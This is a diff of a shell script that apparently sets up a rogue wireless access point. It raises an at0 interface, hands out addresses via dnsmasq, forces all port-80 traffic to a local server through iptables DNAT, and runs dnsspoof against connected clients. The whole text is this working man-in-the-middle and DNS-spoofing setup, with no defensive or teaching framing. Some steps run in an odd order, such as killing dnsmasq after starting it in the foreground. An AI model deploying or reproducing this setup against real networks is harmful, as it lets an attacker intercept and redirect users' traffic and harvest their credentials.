@@ -2,21 +2,21 @@
 
 name="wlan0"
 
-mv dhcpd.conf /etc/dhcp/dhcpd.conf
-
-ifconfig at0 up
+ifconfig at0 10.0.0.1 up
 ifconfig at0 10.0.0.1 netmask 255.255.255.0
 echo 1 > /proc/sys/net/ipv4/ip_forward
+
+cp dhcpd.conf /etc/dhcp/dhcpd.conf
+dnsmasq -C dnsmasq.conf -d
+killall dnsmasq dhcpd isc-dhcp-server
+/etc/init.d/dnsmasq start
+
 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
 
 iptables --flush
-iptables --table nat --flush
-iptables --delete-chain
-iptables --table nat --delete-chain
-iptables -P FORWARD ACCEPT
+iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
 iptables --append FORWARD --in-interface at0 -j ACCEPT
-iptables --table nat --append POSTROUTING --out-interface "$name" -j MASQUERADE
-iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS  --clamp-mss-to-pmtu
-iptables -t nat -A PREROUTING -p tcp -m multiport --dport 80,8080 -j DNAT --to 10.0.0.1:80
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
+iptables -t nat -A POSTROUTING -j MASQUERADE
 
-dhcpd -cf /etc/dhcp/dhcpd.conf at0
+dnsspoof -i at0
